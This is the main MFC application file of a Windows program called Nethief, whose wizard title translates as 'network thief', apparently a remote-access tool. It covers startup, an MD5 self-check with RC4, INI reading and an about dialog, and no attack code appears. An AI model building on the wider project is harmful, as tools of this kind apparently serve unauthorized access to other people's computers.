//Download by http://www.NewXing.com
// Nethief.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Nethief.h"

#include "MainFrm.h"
#include "NethiefDoc.h"
#include "MyFormView.h"

#include "TipOfTheDayDlg.h"
#include "WizardPage1.h"
#include "WizardPage2.h"
#include "WizardPage3.h"
#include "WizardPage31.h"
#include "WizardPage4.h"
#include "WizardPage5.h"
#include "WizardPage6.h"
#include "EasterEggDlg.h"
#include "SplashDlg.h"

#include "Md5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CNethiefApp

BEGIN_MESSAGE_MAP(CNethiefApp, CWinApp)
	//{{AFX_MSG_MAP(CNethiefApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNethiefApp construction

CNethiefApp::CNethiefApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	m_hMutex=NULL;
	nEasterEgg=0;
}

CNethiefApp::~CNethiefApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	if(m_hMutex!=NULL)
	{		
		CloseHandle(m_hMutex);
	}

	delete pCommunity;
	delete pFileSocket;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CNethiefApp object

CNethiefApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CNethiefApp initialization

BOOL CNethiefApp::InitInstance()
{
	m_hMutex=CreateMutex(NULL,FALSE,"Nethief");
	if(GetLastError()==ERROR_ALREADY_EXISTS)
	{
		m_hMutex=NULL;
		return FALSE;
	}
	///////////////////////////////////
	//检查MD5校验和是否正确
	if(!CheckSum())//如果校验和不正确就退出
		return FALSE;
	///////////////////////////////////
	if(GetINIfileInt("FTP Server Setting","IsRegistered")==-1)
	{
		AfxMessageBox("读取配置文件错误，请重新安装本软件。");
		return FALSE;
	}
	//////////////////////////////////////
	//显示启动画面
	CSplashDlg wndSplashDlg(NULL);	//启动画面对话框
	wndSplashDlg.Create(IDD_SPLASH,NULL);
	//从INI文件中读取软件版本和发布日期//////////////////////
	m_strVersion=GetINIfileString("Version Info","Version");
	m_strDate=GetINIfileString("Version Info","Date");
	pCommunity=new CCommunity;
	pFileSocket=new CFileSocket;
	/////////////////////////////////////////////////////////
	if(!AfxSocketInit())
	{
		AfxMessageBox(IDP_SOCKETS_INIT_FAILED);
		return FALSE;
	}

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CNethiefDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CMyFormView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();

	//关闭启动画面
	wndSplashDlg.DestroyWindow();
	//显示免费版说明///////////////////////////
	if(!pCommunity->m_bIsRegistered)//如果没有设置就显示免费版说明
	{
		m_pMainWnd->MessageBox(MESSAGEBOX_TEXT,MESSAGEBOX_CAPTION,
			MB_ICONINFORMATION|MB_OK);
	}
	//是否显示每日一帖/////////////////////////
	if(GetINIfileInt("Tip of the day","Startup"))
	{
		CTipOfTheDayDlg dlg;
		dlg.DoModal();
	}
	////////如果是初次使用,显示设置向导///////////////
	RegisterAccounts();
	//////////////////////////////////////////////////////
	return TRUE;
}

void CNethiefApp::RegisterAccounts()
{
	if(pCommunity->m_bIsRegistered)//如果已经设置了就返回
		return;
	////////////////////////////////////////////////////
	CPropertySheet propsheet("网络神偷 设置向导");

	CWizardPage1 WizardPage1;
	CWizardPage2 WizardPage2;
	CWizardPage3 WizardPage3;
	CWizardPage31 WizardPage31;
	CWizardPage4 WizardPage4;
	CWizardPage5 WizardPage5;
	CWizardPage6 WizardPage6;

	propsheet.AddPage(&WizardPage1);
	propsheet.AddPage(&WizardPage2);
	propsheet.AddPage(&WizardPage3);
	propsheet.AddPage(&WizardPage31);
	propsheet.AddPage(&WizardPage4);
	propsheet.AddPage(&WizardPage5);
	propsheet.AddPage(&WizardPage6);
	propsheet.SetWizardMode();

	propsheet.DoModal();
}

//检查MD5校验和是否正确
BOOL CNethiefApp::CheckSum()
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.ReleaseBuffer();

	CString strPath=exeFullPath.Left(exeFullPath.ReverseFind('\\'));

	CString strFile[5];
	strFile[0]=strPath+"\\FAQ.txt";
	strFile[1]=strPath+"\\License.txt";
	strFile[2]=strPath+"\\Sale.txt";
	strFile[3]=strPath+"\\Support.txt";
	strFile[4]=exeFullPath;

	BYTE* pbyFileContent[5];
	DWORD dwFileLength[5];

	DWORD dwTotalLength=0;
	/////////////////////////////////////////
	//读出每个文件的内容
	for(int i=0;i<5;i++)
	{
		try
		{
			CFile File(strFile[i],CFile::modeRead|CFile::shareDenyNone);

			dwFileLength[i]=File.GetLength();
			if(i==4)//如果是Nethief.exe就不要读入校验数据
				dwFileLength[i]-=16;
			pbyFileContent[i]=new BYTE[dwFileLength[i]];

			File.Read(pbyFileContent[i],dwFileLength[i]);
			File.Close();

			dwTotalLength+=dwFileLength[i];
		}
		catch(...)
		{
			return FALSE;
		}
	}

	BYTE* pbyTotalContent=new BYTE[dwTotalLength];
	DWORD dwPos=0;
	for(i=0;i<5;i++)
	{
		memcpy(&pbyTotalContent[dwPos],pbyFileContent[i],dwFileLength[i]);
		dwPos+=dwFileLength[i];
	}
	///////////////////////////////////////////////
	//算出MD5校验和并加密它
	BYTE byCheckSum[16];
	ZeroMemory(byCheckSum,sizeof(byCheckSum));

	CMd5 Md5;
	Md5.GetMD5CheckSum(pbyTotalContent,dwTotalLength,byCheckSum);

	EncryptData(byCheckSum,sizeof(byCheckSum),PUBLICPASSWORD);

	//清除对象
	for(i=0;i<5;i++)
	{
		delete pbyFileContent[i];
	}
	delete pbyTotalContent;
	/////////////////////////////////////////////////
	BYTE bySelfCheckSum[16];
	CFile File(strFile[4],CFile::modeRead|CFile::shareDenyNone);

	File.Seek(-sizeof(bySelfCheckSum),CFile::end);
	File.Read(bySelfCheckSum,sizeof(bySelfCheckSum));
	File.Close();
	///////////////////////////////////////////////////
#if CHECK_SUM
	int nRet=memcmp(byCheckSum,bySelfCheckSum,sizeof(byCheckSum));
	if(nRet!=0)//不正确就退出程序
		return FALSE;
#endif
	return TRUE;
}

void CNethiefApp::EncryptData(LPVOID pVoid,DWORD dwBufLen,CString strKey)
{
	rc4_key key;
	int nKeyLen=strKey.GetLength();

	prepare_key((unsigned char*)strKey.GetBuffer(nKeyLen),nKeyLen,&key);
	rc4((unsigned char*)pVoid,dwBufLen,&key);
}

void CNethiefApp::prepare_key(unsigned char *key_data_ptr, int key_data_len, rc4_key *key)
{
	unsigned char t;
	unsigned char index1;
	unsigned char index2;
	unsigned char* state;
	short counter;

	state = &key->state[0];
	for(counter = 0; counter < 256; counter++)
		state[counter] =(unsigned char)counter;
	key->x = 0;
	key->y = 0;
	index1 = 0;
	index2 = 0;
	for(counter = 0; counter < 256; counter++)
	{
		index2 = (key_data_ptr[index1] + state[counter] + index2) % 256;
		swap_byte(&state[counter], &state[index2]);
		index1 = (index1 + 1) % key_data_len;
	}
}

void CNethiefApp::rc4(unsigned char *buffer_ptr, DWORD buffer_len, rc4_key *key)
{
	unsigned char t;
	unsigned char x;
	unsigned char y;
	unsigned char* state;
	unsigned char xorIndex;
	DWORD counter;

	x = key->x;
	y = key->y;
	state = &key->state[0];
	for(counter = 0; counter < buffer_len; counter++)
	{
		x = (x + 1) % 256;
		y = (state[x] + y) % 256;
		swap_byte(&state[x], &state[y]);
		xorIndex = (state[x] + state[y]) % 256;
		buffer_ptr[counter] ^= state[xorIndex];
	}
	key->x = x;
	key->y = y;
}

/////////////////////////////////////////////////////////////////////////////
// CNethiefApp commands
///////////操作INI文件的函数////////////////////
CString CNethiefApp::GetINIfileString(LPCTSTR lpSectionName, LPCTSTR lpKeyName)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,	 //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	int nLength=400;
	///////////////////////////////////////////////////////////
	CString strString;           //用于保存读出的字符串
	GetPrivateProfileString(lpSectionName,lpKeyName,"Error",
		strString.GetBufferSetLength(nLength),nLength,
		exeFullPath.GetBufferSetLength(MAX_PATH));
	strString.ReleaseBuffer();
	return strString;
}

int CNethiefApp::GetINIfileInt(LPCTSTR lpSectionName, LPCTSTR lpKeyName)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	return GetPrivateProfileInt(lpSectionName,lpKeyName,-1,
		exeFullPath.GetBufferSetLength(MAX_PATH));
}

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About
#include "LinkStatic.h"

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

	HCURSOR m_hCursorArrow; //普通箭头光标
	HCURSOR m_hCursorHand;  //手形光标

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	CLinkStatic	m_LinkStatic_Homepage;
	CLinkStatic	m_LinkStatic_Email;
	CString	m_strDate;
	CString	m_strVersion;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	virtual BOOL OnInitDialog();
	afx_msg BOOL OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message);
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	m_strDate = _T("");
	m_strVersion = _T("");
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	DDX_Control(pDX, IDC_STATIC_HOMEPAGE, m_LinkStatic_Homepage);
	DDX_Control(pDX, IDC_STATIC_EMAIL, m_LinkStatic_Email);
	DDX_Text(pDX, IDC_STATIC_DATE, m_strDate);
	DDX_Text(pDX, IDC_STATIC_VERSION, m_strVersion);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	ON_WM_SETCURSOR()
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CNethiefApp::OnAppAbout()
{
	if(GetAsyncKeyState(VK_SHIFT)==-32767 && GetAsyncKeyState(VK_CONTROL)==-32767 && GetAsyncKeyState(VK_MENU)==-32767)
	{
		nEasterEgg++;
		if(nEasterEgg>=3)
		{
			nEasterEgg=0;
			CEasterEggDlg dlg;
			dlg.DoModal();
			return;
		}
	}
	else
	{
		nEasterEgg=0;
	}
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_hCursorArrow=AfxGetApp()->LoadStandardCursor(IDC_ARROW);
	m_hCursorHand=AfxGetApp()->LoadCursor(IDC_CURSOR_HAND);

	CNethiefApp* app=(CNethiefApp*)AfxGetApp();
	m_strVersion=app->m_strVersion;
	m_strDate=app->m_strDate;
	UpdateData(FALSE);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

BOOL CAboutDlg::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message) 
{
	// TODO: Add your message handler code here and/or call default
	if(IDC_STATIC_EMAIL==pWnd->GetDlgCtrlID()||IDC_STATIC_HOMEPAGE==pWnd->GetDlgCtrlID())
		SetCursor(m_hCursorHand);
	else
		SetCursor(m_hCursorArrow);

	return TRUE;
}

HBRUSH CAboutDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	
	// TODO: Change any attributes of the DC here
	if(IDC_STATIC_EMAIL==pWnd->GetDlgCtrlID()||IDC_STATIC_HOMEPAGE==pWnd->GetDlgCtrlID())
	{
		//设置字符颜色
		pDC->SetTextColor(RGB(0,0,255));
	}
	
	// TODO: Return a different brush if the default is not desired
	return hbr;
}
